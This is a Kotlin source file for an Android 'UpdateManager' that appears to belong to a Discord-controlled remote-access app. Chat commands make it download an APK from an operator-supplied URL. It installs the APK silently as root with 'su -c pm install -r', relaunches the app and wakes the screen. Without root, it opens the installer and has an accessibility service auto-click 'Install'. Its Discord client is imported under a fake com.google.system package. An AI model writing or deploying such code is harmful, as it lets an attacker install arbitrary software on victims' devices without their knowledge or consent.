package com.openaccess.sdk.update

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import androidx.core.content.FileProvider
import com.google.system.DiscordGatewayClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

object UpdateManager {
    private const val UPDATE_FILE = "pending_update.apk"
    private const val PREFS_NAME = "update_state"
    private const val KEY_VERSION = "pending_version"
    private const val KEY_HASH = "pending_hash"
    private const val KEY_STATUS = "update_status"

    private val downloadClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .followRedirects(true)
        .followSslRedirects(true)
        .build()

    enum class Status {
        NONE, CHECKING, DOWNLOADING, DOWNLOADED, INSTALLING, INSTALLED, FAILED
    }

    fun getStatus(ctx: Context): Status {
        val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val s = prefs.getString(KEY_STATUS, Status.NONE.name)
        return try { Status.valueOf(s ?: "NONE") } catch (_: Exception) { Status.NONE }
    }

    fun getPendingVersion(ctx: Context): Int {
        return ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getInt(KEY_VERSION, -1)
    }

    fun getCurrentVersion(ctx: Context): Pair<String, Int> {
        return try {
            val pi = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
            val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) pi.longVersionCode.toInt() else pi.versionCode
            Pair(pi.versionName ?: "?", code)
        } catch (_: Exception) {
            Pair("?", -1)
        }
    }

    fun getUpdateFile(ctx: Context): File {
        return File(ctx.getExternalFilesDir(null), UPDATE_FILE)
    }

    suspend fun checkForUpdate(ctx: Context, discord: DiscordGatewayClient): String {
        return withContext(Dispatchers.IO) {
            try {
                setStatus(ctx, Status.CHECKING)
                val (currentName, currentCode) = getCurrentVersion(ctx)
                val pending = getPendingVersion(ctx)

                if (pending > 0 && pending > currentCode) {
                    val updateFile = getUpdateFile(ctx)
                    if (updateFile.exists()) {
                        return@withContext ":white_check_mark: **Update Ready**\nCurrent: v$currentName ($currentCode)\nPending: v$pending\nType `!update install` to apply."
                    }
                }

                setStatus(ctx, Status.NONE)
                ":information_source: **Current Version**: v$currentName ($currentCode)\nNo pending updates. Use `!update push <url>` to push a new APK."
            } catch (e: Exception) {
                setStatus(ctx, Status.FAILED)
                ":x: **Check failed**: ${e.message?.take(80) ?: "unknown"}"
            }
        }
    }

    suspend fun downloadUpdate(ctx: Context, discord: DiscordGatewayClient, url: String): String {
        return withContext(Dispatchers.IO) {
            var bytesDownloaded = 0L
            var totalBytes = 0L
            var lastProgressUpdate = 0L
            try {
                setStatus(ctx, Status.DOWNLOADING)
                discord.sendMsg(":arrow_down: **Downloading update**...")

                val request = Request.Builder().url(url).build()
                val response = downloadClient.newCall(request).execute()

                if (!response.isSuccessful) {
                    response.close()
                    setStatus(ctx, Status.FAILED)
                    return@withContext ":x: **Download failed**: HTTP ${response.code}"
                }

                totalBytes = response.body?.contentLength() ?: 0L
                val updateFile = getUpdateFile(ctx)
                response.body?.byteStream()?.use { input ->
                    FileOutputStream(updateFile).use { output ->
                        val buffer = ByteArray(8192)
                        var read: Int
                        while (input.read(buffer).also { read = it } != -1) {
                            output.write(buffer, 0, read)
                            bytesDownloaded += read
                            val now = System.currentTimeMillis()
                            if (totalBytes > 0 && now - lastProgressUpdate > 3000) {
                                lastProgressUpdate = now
                                val pct = (bytesDownloaded * 100 / totalBytes).toInt()
                                discord.sendMsg(":arrow_down: Downloading... ${pct}% (${formatSize(bytesDownloaded)}/${formatSize(totalBytes)})")
                            }
                        }
                    }
                }
                response.close()

                if (!updateFile.exists() || updateFile.length() == 0L) {
                    updateFile.delete()
                    setStatus(ctx, Status.FAILED)
                    return@withContext ":x: **Download failed**: Empty file"
                }

                val apkSize = formatSize(updateFile.length())

                val newVersion = parseApkVersion(ctx, updateFile)
                val (currentName, currentCode) = getCurrentVersion(ctx)

                val prefs = ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                prefs.edit()
                    .putInt(KEY_VERSION, newVersion.second)
                    .putString(KEY_STATUS, Status.DOWNLOADED.name)
                    .apply()

                val msg = buildString {
                    appendLine(":white_check_mark: **Update Downloaded**")
                    appendLine("Current: v$currentName ($currentCode)")
                    appendLine("New: v${newVersion.first} (${newVersion.second})")
                    appendLine("Size: $apkSize")
                    appendLine("Type `!update install` to apply.")
                }
                setStatus(ctx, Status.DOWNLOADED)
                msg
            } catch (e: Exception) {
                setStatus(ctx, Status.FAILED)
                ":x: **Download error**: ${e.message?.take(80) ?: "unknown"}"
            }
        }
    }

    fun installUpdate(ctx: Context, discord: DiscordGatewayClient?) {
        try {
            val updateFile = getUpdateFile(ctx)
            if (!updateFile.exists()) {
                discord?.sendMsg(":x: **No update file found**. Download first with `!update push <url>`")
                return
            }

            setStatus(ctx, Status.INSTALLING)

            // Try root-based silent install first
            val rootInstall = tryRootInstall(ctx, updateFile)
            if (rootInstall) {
                discord?.sendMsg(":white_check_mark: **Update installed silently** (root)")
                setStatus(ctx, Status.INSTALLED)
                updateFile.delete()
                return
            }

            // Fallback: PackageInstaller UI + accessibility auto-click
            discord?.sendMsg(":package: **Installing update**... (accessibility will auto-click Install)")

            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                FileProvider.getUriForFile(
                    ctx,
                    "${ctx.packageName}.fileprovider",
                    updateFile
                )
            } else {
                Uri.fromFile(updateFile)
            }

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            }

            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    ctx.startActivity(intent)
                } catch (e: Exception) {
                    setStatus(ctx, Status.FAILED)
                    discord?.sendMsg(":x: **Install failed**: ${e.message?.take(80) ?: "unknown"}")
                }
            }, 500)

            // Reset install state in accessibility after 30s
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                com.openaccess.sdk.service.InputHelper.resetInstallState()
            }, 30000)
        } catch (e: Exception) {
            setStatus(ctx, Status.FAILED)
            discord?.sendMsg(":x: **Install failed**: ${e.message?.take(80) ?: "unknown"}")
        }
    }

    private fun tryRootInstall(ctx: Context, apkFile: File): Boolean {
        return try {
            val pkgName = ctx.packageName
            val installCmd = "pm install -r ${apkFile.absolutePath}"
            val launchCmd = "am start -n $pkgName/.MainActivity --activity-no-history"

            android.util.Log.d("UpdateManager", "Running root install: $installCmd")
            val installProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", installCmd))
            val installOutput = installProcess.inputStream.bufferedReader().use { it.readText() }
            val installError = installProcess.errorStream.bufferedReader().use { it.readText() }
            val installExit = installProcess.waitFor()
            installProcess.inputStream.close()
            installProcess.errorStream?.close()

            android.util.Log.d("UpdateManager", "Install exit: $installExit, output: $installOutput")
            if (installError.isNotBlank()) android.util.Log.w("UpdateManager", "Install stderr: $installError")

            val success = installOutput.contains("Success") || installOutput.contains("success") || installExit == 0
            if (success) {
                android.util.Log.d("UpdateManager", "Install succeeded, launching app...")

                // Wait for PackageManager to fully settle before launching
                try { Thread.sleep(3000) } catch (_: Exception) {}

                // Use monkey (more reliable for service-based apps) as primary launch method
                var launched = false
                try {
                    val monkeyProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "monkey -p $pkgName -c android.intent.category.LAUNCHER 1 2>/dev/null"))
                    monkeyProc.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
                    monkeyProc.inputStream.close()
                    monkeyProc.errorStream?.close()
                    android.util.Log.d("UpdateManager", "Monkey launch completed")
                    launched = true
                } catch (e: Exception) {
                    android.util.Log.w("UpdateManager", "Monkey launch failed: ${e.message}")
                }

                // Fallback to am start if monkey didn't work
                if (!launched) {
                    try {
                        val launchProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", launchCmd))
                        launchProcess.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
                        launchProcess.inputStream.close()
                        launchProcess.errorStream?.close()
                        android.util.Log.d("UpdateManager", "am start launch completed")
                    } catch (e: Exception) {
                        android.util.Log.w("UpdateManager", "am start also failed: ${e.message}")
                    }
                }

                try {
                    val wakeCmd = "input keyevent KEYCODE_WAKEUP"
                    val wakeProc = Runtime.getRuntime().exec(arrayOf("su", "-c", wakeCmd))
                    wakeProc.waitFor(2, java.util.concurrent.TimeUnit.SECONDS)
                    wakeProc.inputStream.close()
                    wakeProc.errorStream?.close()
                    android.util.Log.d("UpdateManager", "Screen wakeup sent")
                } catch (_: Exception) {}
            }

            success
        } catch (e: Exception) {
            android.util.Log.e("UpdateManager", "Root install failed: ${e.message}")
            false
        }
    }

    fun clearUpdate(ctx: Context) {
        try {
            getUpdateFile(ctx).delete()
            ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
                .clear()
                .apply()
            setStatus(ctx, Status.NONE)
        } catch (_: Exception) {}
    }

    private fun setStatus(ctx: Context, status: Status) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
            .putString(KEY_STATUS, status.name)
            .apply()
    }

    private fun parseApkVersion(ctx: Context, apkFile: File): Pair<String, Int> {
        return try {
            val pm = ctx.packageManager
            val pi = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getPackageArchiveInfo(apkFile.absolutePath, PackageManager.PackageInfoFlags.of(0L))
            } else {
                @Suppress("DEPRECATION")
                pm.getPackageArchiveInfo(apkFile.absolutePath, 0)
            }
            if (pi != null) {
                val name = pi.versionName ?: "?"
                val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) pi.longVersionCode.toInt() else pi.versionCode
                Pair(name, code)
            } else {
                Pair("unknown", -1)
            }
        } catch (_: Exception) {
            Pair("unknown", -1)
        }
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            else -> String.format("%.1f MB", bytes / (1024.0 * 1024.0))
        }
    }
}
